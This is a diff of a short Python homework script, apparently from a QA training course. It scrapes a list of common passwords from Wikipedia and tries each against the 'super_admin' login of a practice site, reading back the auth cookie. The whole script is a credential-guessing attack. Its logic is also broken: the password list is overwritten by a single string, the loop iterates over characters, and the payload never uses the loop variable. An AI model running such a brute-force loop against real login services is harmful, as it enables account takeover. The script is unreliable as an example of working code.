@@ -1,5 +1,20 @@
+
 import requests
-list=['12345','123456789','qwerty','password','1234567','12345678','12345','iloveyou','111111','123123','abc123','qwerty123','q2w3e4r','admin','qwertyuiop','654321','555555','lovely','7777777','welcome','888888','princess','dragon','password1','123qwe']
+from lxml import html
+
+response3 = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
+
+tree = html.fromstring(response3.text)
+
+locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
+passwords = tree.xpath(locator)
+
+for password in passwords:
+    password = str(password).strip()
+    print(password)
+
+
+list=str(password).strip()
 for el in list:
     payload = {"login": "super_admin", "password": list}
     response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
@@ -8,6 +23,12 @@ for el in list:
     cookies = {'auth_cookie': cookie_value}
     response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
     print(response2.text)
+else:
+    print(password)
+
+
+
+
 
 
 
